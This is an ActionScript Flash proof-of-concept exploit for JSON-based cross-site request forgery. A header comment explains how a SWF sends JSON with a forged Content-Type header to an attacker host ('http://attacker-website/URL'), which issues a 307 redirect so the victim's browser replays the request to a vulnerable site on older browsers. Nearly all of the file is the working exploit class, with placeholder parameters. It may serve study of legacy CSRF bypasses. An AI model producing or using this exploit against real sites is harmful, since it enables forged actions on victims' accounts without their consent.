/*
* In case of handling and validating "Content-type" header by backend to be equal to "application/json"
* This PoC might work but not on modern web browsers
* Because they fire preflight "CrossDomain.xml" request
* to check if its allowed by the vulnerable web server to make request from another origin (http://attacker-website/URL)
* But on older browsers it works because they don't check CORS in case of using swf flash files! such a pity!!
* After receiving the request by the attacker, She will send 307 code http response to the vulnerable website
* This leads to victim send the request to vulnerable website with the specified json data and required header
* And it completes the CSRF
* */


package
{
import flash.display.Sprite;
import flash.net.URLLoader;
import flash.net.URLRequest;
import flash.net.URLRequestHeader;
import flash.net.URLRequestMethod;
import flash.events.Event;

public class CSRFClient extends Sprite {

    public function CSRFClient() {super();}

    public function exploit():void{

        // required json parameters
        var data:Object = {
            "param1":"value1",
            "param2":"value2"
            /*
            *
            */
        };

        var myJson:String = JSON.stringify(data);
        var url:String = "http://attacker-website/URL";

        var request:URLRequest = new URLRequest(url);

        // set required header
        request.requestHeaders.push(new URLRequestHeader("Content-Type","application/json"));

        request.data = myJson;
        request.method = URLRequestMethod.GET;
        var urlLoader:URLLoader = new URLLoader();

        urlLoader.addEventListener(Event.COMPLETE, responseReceived);
        urlLoader.load(request);

    }

    private static function responseReceived(event:Event):void{
        trace(event.target.data);
    }


}

}